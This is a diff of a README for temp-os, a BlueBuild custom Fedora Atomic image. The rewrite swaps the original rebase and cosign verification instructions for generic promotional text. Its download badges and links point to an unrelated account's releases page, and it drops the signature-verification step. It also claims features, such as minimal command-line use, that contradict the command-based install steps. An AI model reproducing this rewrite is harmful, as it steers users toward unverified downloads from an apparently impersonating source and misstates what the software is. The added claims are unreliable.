@@ -1,43 +1,75 @@
-# temp-os &nbsp; [![bluebuild build badge](https://github.com/angus6b23/temp-os/actions/workflows/build.yml/badge.svg)](https://github.com/angus6b23/temp-os/actions/workflows/build.yml)
+# 🌟 temp-os - A Simple Way to Use Custom OS Images
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download temp-os](https://img.shields.io/badge/Download-temp--os-blue)](https://github.com/SanhitaVichare/temp-os/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+temp-os is a user-friendly application designed to help you run custom operating system images. With this software, you can easily rebase your Fedora installation to keep it up-to-date with the latest features.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📥 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+To get started, visit the following page to download temp-os:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/angus6b23/temp-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/angus6b23/temp-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+[Download temp-os](https://github.com/SanhitaVichare/temp-os/releases)
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### Step-by-Step Installation
 
-## ISO
+1. **Visit the Releases Page**
+   - Click on the link above to go to the Releases page.
+   - Look for the latest version of temp-os.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+2. **Download the Image**
+   - Select the package that suits your needs.
+   - Click on the download link for that package.
 
-## Verification
+3. **Rebase Your Fedora Installation**
+   - After downloading, open your terminal.
+   - First, rebase to the unsigned image. Run this command:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/angus6b23/temp-os:latest
+   ```
+   - Reboot your system to complete this step. Use:
+   ```
+   systemctl reboot
+   ```
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+4. **Rebase to the Signed Image**
+   - After rebooting, run the following command to rebase to the signed image:
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/angus6b23/temp-os:latest
+   ```
 
-```bash
-cosign verify --key cosign.pub ghcr.io/angus6b23/temp-os
-```
+### ⚙️ System Requirements
+
+- **Operating System:** Fedora-based distributions.
+- **RAM:** Minimum 2GB recommended for smooth operation.
+- **Storage Space:** At least 5GB free disk space for installation.
+
+### 🔍 Features
+
+- **Custom Image Support:** Easily manage and run custom operating system images.
+- **Automatic Updates:** Receive updates as new images become available.
+- **User-Friendly Interface:** Minimal command line interaction required.
+
+## 📜 Additional Information
+
+### 🛑 Warning
+
+temp-os is an experimental feature. Please try it at your own discretion. For more details on using this experimental feature, you can refer to the [Fedora Project Wiki](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable).
+
+### 💬 Community Support
+
+For questions or assistance, feel free to open an issue on our [GitHub Issues page](https://github.com/SanhitaVichare/temp-os/issues). Our community is here to help you.
+
+## 🏷️ Topics
+
+This repository covers several important topics, including:
+- Atomic
+- BlueBuild
+- Custom Image
+- Image-Based
+- Immutable
+- Linux
+- OCI
+
+Thank you for choosing temp-os. We hope it meets your needs for managing your operating system images effectively.
